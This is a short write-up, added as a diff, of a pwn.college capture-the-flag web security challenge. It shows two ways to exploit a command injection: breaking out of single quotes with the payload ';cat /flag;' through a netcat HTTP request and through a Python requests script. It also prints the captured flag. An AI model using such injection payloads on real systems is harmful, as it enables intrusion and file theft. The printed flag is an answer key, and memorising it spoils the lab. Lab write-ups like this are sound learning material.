@@ -1,0 +1,44 @@
+# challenge: CDMi 3
+
+📅 2026-01-22
+📁 web security
+
+---
+
+## ✅ what i did  
+I WAY -> netcat
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+found out the endpoint is /stage
+the sever surround our command with '' -> '{arg}'
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /stage?dir=';cat%20%2Fflag;' HTTP/1.1'
+        'Host: challenge.localhost'
+-flag popped out
+
+II WAY -> python
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'import requests'
+        'from pwn import *'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost/stage"'
+        'params = {'
+                '"dir" : "';cat /flag;'"'
+                '}'
+        'r = requests.get(url, params)'
+        'print(r.text)'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+we can inject a single quote allowing us to hijack security filters based on quotes '
+in python u dont need to url encode the args to avoid convertion if u pass em as parameters in requests.get
+
+## 🏁 Flag  
+pwn.college{oKzzZKSDvPh6bnqOgGMniwUkexr.QX2YTN2wCO4IDOxEzW}
